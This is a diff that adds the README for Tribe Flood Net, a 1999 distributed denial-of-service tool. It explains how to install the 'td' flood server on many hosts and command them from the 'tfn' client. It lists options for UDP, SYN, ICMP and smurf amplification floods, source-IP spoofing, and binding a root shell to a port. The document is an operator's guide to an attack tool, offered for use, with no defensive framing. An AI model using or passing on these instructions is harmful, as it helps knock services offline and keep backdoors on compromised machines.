@@ -1,0 +1,61 @@
+Tribe Flood Net Project (c) 1999 by Mixter - PRIVATE
+
+"Simpler. Faster. Eleetness-enhanced. More owning." -- P. Monkey
+
+Disclaimer:
+The source code may not be modified or re-used, the source
+code or other parts of the distribtution may not be 
+altered until permission is given by the author explicitly.
+I do not give any warranty and I cannot be held liable
+for any implicit or explicit damage caused by usage
+of the program by others.
+
+About:
+TFN Server and Client
+ICMP-Controlled remote udp/syn/icmp/smurf flood network
+
+Installation:
+1) Read and edit config.h
+2) Type 'make'
+
+Usage:
+Install the server 'td' on a number of hosts. Put all IP
+addresses of the hosts running the server into a list; this
+will be your iplist.
+Run the client 'tfn' from anywhere, using the iplist as first
+parameter. You can use the following request types:
+
+-2 <bytes>         set packet size for packets used for udp/icmp/smurf attacks
+-1 <mask>          set spoof mask. 0 will use random ips, 1 uses the correct
+                   class a, 2 correct class b and 3 correct class c ip value
+0                  stop current floods; if no floods are found, display status
+1 <targets>        udp flood. target is one ip or multiple ips separated by @
+2 <targets> <port> syn flood. if port is 0, random ports are used.
+3 <targets>        icmp echo request flood.
+4 <port>           only if compiled with ID_SHELL. bind a rootshell to <port>
+5 <target@bcasts>  smurf amplifier icmp attack. unlike the above floods,
+                   this only supports a single target. further ips separated
+                   by @ will be used as smurf amplifier broadcast addresses
+
+Acknowledgements:
+Ideas for syn.c partially from synk4.
+Ideas for tfn partially from randomizers code.
+Idea for multiple target implementation from phiflis code.
+send_connect and other stuff from icmpd.c by so1o.
+Coding inspiration by Satan and the United Association of Lawyers.
+TFN was made by Mixter.
+
+-- Mixter
+<mixter@newyorkoffice.com>
+http://members.xoom.com/i0wnu
+
+MD5SUM				  FILE
+506fc8f7e96cc711db372293ce22eefe  Makefile
+c537e4e65d129b1451a143fb5a32273a  config.h
+e28943284ee17ecb49b1f698fd6a546c  control.h
+6f6a7778be226096d1c45a5304e7e2ef  icmp.c
+97c9c9b3f250e8d97e8175f26fe6b418  syn.c
+b7004f017f59487674a04a8d7ab27d66  td.c
+eb903d27d894a5536f4e63cffb5e1159  tribe.c
+3449b298d855487f2865fcd16cacd035  tubby.h
+b1c8a03d153dca55070558080dce144c  udp.c
